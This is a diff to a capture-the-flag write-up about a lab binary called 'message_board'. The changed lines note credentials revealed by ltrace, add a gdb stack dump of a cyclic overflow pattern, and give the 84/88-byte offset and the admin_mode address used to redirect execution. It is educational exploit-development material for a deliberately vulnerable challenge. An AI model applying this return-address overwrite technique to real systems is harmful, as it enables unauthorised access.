@@ -19,11 +19,10 @@ Password: me
 Error: Invalid username or password
 ```
 
-Running ltrace reveals the username=user and the password=easy_pass
+Running ltrace reveals the username=user and the password=easy_pass (ltrace was not working in pwnbox at the time of writing this but it shouldnt be too hard to understand)
 
 
-
-After logging in we can finally leave a message. This is where we can cause our buuffer overflow.
+After logging in we can finally leave a message. This is where we can cause our buffer overflow.
 
 ```console
 └──╼ [★]$ ./message_board 
@@ -149,6 +148,23 @@ Our offset is 84. Then add 4 to get to the end of $RBP and that gives 88 where o
 ```console
 cyclic -l vaaa
 84
+```
+We can also see that in $rsp that on address line 0x7fffffffdf80 that an address is being read and we can overwrite this.
+
+```console
+0x7fffffffdf20:	0xffffe078	0x00007fff	0x00000000	0x00000001
+0x7fffffffdf30:	0x61616161	0x61616162	0x61616163	0x61616164
+0x7fffffffdf40:	0x61616165	0x61616166	0x61616167	0x61616168
+0x7fffffffdf50:	0x61616169	0x6161616a	0x6161616b	0x6161616c
+0x7fffffffdf60:	0x6161616d	0x6161616e	0x6161616f	0x61616170
+0x7fffffffdf70:	0x61616171	0x61616172	0x61616173	0x61616174
+0x7fffffffdf80:	0x61616175	0x00616176	0xf7e0cd00	0x00007fff
+0x7fffffffdf90:	0xffffe078	0x00007fff	0x00000000	0x00000001
+0x7fffffffdfa0:	0x00401345	0x00000000	0xf7e0c7cf	0x00007fff
+0x7fffffffdfb0:	0x00000000	0x00000000	0x74d22510	0x0b68a730
+0x7fffffffdfc0:	0x004010e0	0x00000000	0x00000000	0x00000000
+0x7fffffffdfd0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffdfe0:	0xe3f22510	0xf497584f
 ```
 
 Since we want the address to take us to admin_mode we will use the address that calls to admin_mode from main. You could also disassemble admin_mode and use the starting address in there "0x401326" 
